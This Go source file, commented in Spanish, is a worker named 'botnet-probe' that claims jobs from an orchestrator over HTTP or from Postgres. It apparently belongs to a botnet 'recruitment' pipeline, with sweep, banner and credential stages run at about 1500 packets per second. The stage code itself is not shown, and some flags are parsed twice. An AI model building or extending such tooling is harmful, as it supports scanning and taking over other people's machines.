// botnet-probe: worker de prueba del servicio de reclutamiento.
//
// Pide trabajo al orquestador por HTTP y, si no esta, reclama directo en
// Postgres con SKIP LOCKED al suelo de 1500 pps (RECRUIT_WORKER_CLAIM_FALLBACK=1).
// El trabajo no se para porque el orquestador caiga: solo baja el ritmo.
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/botnet/botnet/internal/recruit"
)

const name = "botnet-probe"

// ppsSuelo es el ritmo cuando no hay orquestador que reparta.
const ppsSuelo = 1500

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "%s: %v\n", name, err)
		os.Exit(1)
	}
}

func run() error {
	var (
		claim   = flagBool("claim")
		once    = flagBool("once")
		worker  = flagStr("worker", "probe-1")
		stage   = flagStr("stage", "sweep")
		limit   = flagInt("limit", 5)
		api     = flagStr("api", "http://127.0.0.1:9110")
		sweepJ  = flagStr("sweep-json", "")
		limitS  = flagInt("limit", 0)
		dryRun  = flagBool("dry-run")
		emitS   = flagBool("emit-sql")
		cohS    = flagInt("cohort-seconds", defaultCohortSeconds)
		stageB  = flagStr("stage", "")
		bannerJ = flagStr("banner-json", "")
		credJ   = flagStr("cred-json", "")
	)
	if stageB == "cred" {
		return ejecutarCred(context.Background(), credJ, dryRun)
	}
	if stageB == "banner" {
		return ejecutarBanner(context.Background(), bannerJ, dryRun)
	}
	if sweepJ != "" || dryRun {
		return ejecutarSweep(context.Background(), sweepJ, limitS, dryRun, emitS, cohS)
	}
	_ = once // --once es el modo por defecto cuando hay --claim
	if !claim {
		fmt.Printf("%s: nada que hacer sin --claim\n", name)
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	fallback := os.Getenv("RECRUIT_WORKER_CLAIM_FALLBACK") == "1"
	if !fallback {
		if items, err := claimHTTP(ctx, api, stage, worker, limit); err == nil {
			imprimir(items, "http")
			return nil
		} else if err != nil {
			fmt.Fprintf(os.Stderr, "%s: orquestador no disponible (%v): paso a fallback\n", name, err)
		}
		fallback = true
	}

	st, err := recruit.Open(os.Getenv("DATABASE_URL"), 2)
	if err != nil {
		return err
	}
	defer st.Close()
	items, err := st.ClaimJobs(ctx, stage, worker, limit)
	if err != nil {
		return err
	}
	imprimir(items, "fallback")
	return nil
}

func imprimir(items []recruit.Claimed, via string) {
	// El suelo se anuncia siempre: es el contrato del fallback.
	fmt.Printf("via=%s pps=%d reclamados=%d\n", via, ppsSuelo, len(items))
	b, _ := json.Marshal(items)
	fmt.Println(string(b))
}

func claimHTTP(ctx context.Context, api, stage, worker string, limit int) ([]recruit.Claimed, error) {
	body, _ := json.Marshal(map[string]any{"stage": stage, "worker": worker, "limit": limit})
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, api+"/v1/work/claim", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("content-type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("claim http %d", resp.StatusCode)
	}
	var out struct {
		Items []recruit.Claimed `json:"items"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return nil, err
	}
	return out.Items, nil
}

func flagStr(n, def string) string {
	if v := os.Getenv("PROBE_" + upper(n)); v != "" {
		return v
	}
	for i, a := range os.Args[1:] {
		if a == "--"+n && i+2 <= len(os.Args[1:]) {
			return os.Args[i+2]
		}
		if len(a) > len(n)+3 && a[:len(n)+3] == "--"+n+"=" {
			return a[len(n)+3:]
		}
	}
	return def
}

func flagInt(n string, def int) int {
	v := flagStr(n, "")
	if v == "" {
		return def
	}
	var out int
	fmt.Sscanf(v, "%d", &out)
	if out <= 0 {
		return def
	}
	return out
}

func flagBool(n string) bool {
	for _, a := range os.Args[1:] {
		if a == "--"+n {
			return true
		}
	}
	return false
}

func upper(s string) string {
	out := make([]rune, 0, len(s))
	for _, r := range s {
		if r >= 'a' && r <= 'z' {
			r -= 32
		}
		if r == '-' {
			r = '_'
		}
		out = append(out, r)
	}
	return string(out)
}
